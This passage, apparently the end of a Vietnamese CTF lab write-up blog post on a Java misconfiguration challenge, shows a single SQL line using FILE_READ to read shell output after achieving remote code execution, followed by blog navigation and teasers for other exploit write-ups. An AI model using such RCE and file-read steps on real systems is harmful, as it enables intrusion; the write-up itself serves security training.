+<p>Sau đó dùng read file để có thể đọc được output sau khi thực thi shell.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> FILE_READ(<span class="string">&#x27;output.txt&#x27;</span>, <span class="keyword">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/SyTio257bg.png" alt="image"></p>
+<p>Thành công RCE và đọc được file flag cuối cũng và kết thúc lab misconfig.</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/12/25/2025-12-25-CBJS-Misconfiguration/">https://pzhat.github.io/2025/12/25/2025-12-25-CBJS-Misconfiguration/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/05/2025-12-05-TryHackMe-Hammer/" title="Tryhackme Hammer challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Tryhackme Hammer challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">TryHackMe Hammer Web Challenge WriteUp Enumeration for ports Tại đây mình scan được 2 port đang mở bao gồm :   22&#x2F;tcp : đây là port SSH 1337&#x2F;tcp : đây là port của một cái http service và cái web app này được host lên bằng apache httpd vì đây là chall web nên ta sẽ truy cập vào web app đó.  Exploitation Bước đầu sau khi truy cập vào address vào port 1337 thì nó cho ta một cái web app và cái đầu tiên đập vào mắt ta chính là một cái trang login.  Tại đây mình tiến hành đăng nhập nhưng ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/" title="CyberCon 2025 SafeUpload Web Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CyberCon 2025 SafeUpload Web Challenge</div></div><div class="info-2"><div class="info-item-1">CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến hành thử upload lên file php với nội dung: 123&lt;?phpecho &quot;test&quot;;?&gt;   Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.  Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình t...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-15-CBJS-Java-Deserialize/" title="Java Deserialize CBJS Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Deserialize CBJS Lab</div></div><div class="info-2"><div class="info-item-1">Java Deserialize CBJS LabGiải thích chi tiết về lỗ hổng Deserialization1. Deserialization là gì?  Serialization là quá trình chuyển đổi một object (đối tượng) trong bộ nhớ thành một định dạng có thể lưu trữ hoặc truyền tải (như byte stream, JSON, XML).  Deserialization là quá trình ngược lại - chuyển đổi dữ liệu đã được serialize trở lại thành object trong bộ nhớ.   2. Nguyên nhân Lỗ hổng xảy ra khi:  Ứng dụng deserialize dữ liệu từ nguồn không tin cậy (user input, network). Không có validati...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/" title="Spring Time CTF challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Spring Time CTF challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">Spring Time CTF challenge WriteUp Web App được chia làm 2 services khác nhau bao gồm:  gateman : port 8080 newsman : port 8082  Phân tích từng chức năng từng service Gateman   Nó được chạy bằng port 8080 bên cạnh đó nó còn gọi cloud cùng với đó là expose include ra các chức năng như health , info , gateway. Vậy nên có thể biết được đây là service Spring Cloud với chức năng routing đến các routes.  Newsman  Ta sẽ đi thẳng vào luôn đầu tiên là NewsController.class:  1234567891011121314151617181...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CBJS-Java-Misconfiguration-Challenge"><span class="toc-number">1.</span> <span class="toc-text">CBJS Java Misconfiguration Challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Statement-Viewer-1"><span class="toc-number">1.1.</span> <span class="toc-text">Statement Viewer 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Breakdown"><span class="toc-number">1.1.1.</span> <span class="toc-text">Code Breakdown</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Statement-Viewer-2"><span class="toc-number">1.2.</span> <span class="toc-text">Statement Viewer 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CyberSoc"><span class="toc-number">1.3.</span> <span class="toc-text">CyberSoc</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/25/2025-12-25-CBJS-Misconfiguration/" title="CBJS Java Misconfiguration Challenge">CBJS Java Misconfiguration Challenge</a><time datetime="2025-12-25T13:30:27.815Z" title="Created 2025-12-25 20:30:27">2025-12-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/05/2025-12-05-TryHackMe-Hammer/" title="Tryhackme Hammer challenge WriteUp">Tryhackme Hammer challenge WriteUp</a><time datetime="2025-12-04T18:19:12.763Z" title="Created 2025-12-05 01:19:12">2025-12-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/" title="IredTeam AS-REP Roasting">IredTeam AS-REP Roasting</a><time datetime="2025-12-01T19:26:14.492Z" title="Created 2025-12-02 02:26:14">2025-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/01/2025-12-01-SSTI-Lab/" title="ServerSide Template Injection (SSTI) Lab">ServerSide Template Injection (SSTI) Lab</a><time datetime="2025-12-01T08:32:26.148Z" title="Created 2025-12-01 15:32:26">2025-12-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/25/2025-11-25-GraphQL-API-Vulnerability/" title="GraphQL API Vulnerability">GraphQL API Vulnerability</a><time datetime="2025-11-24T21:38:11.491Z" title="Created 2025-11-25 04:38:11">2025-11-25</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>
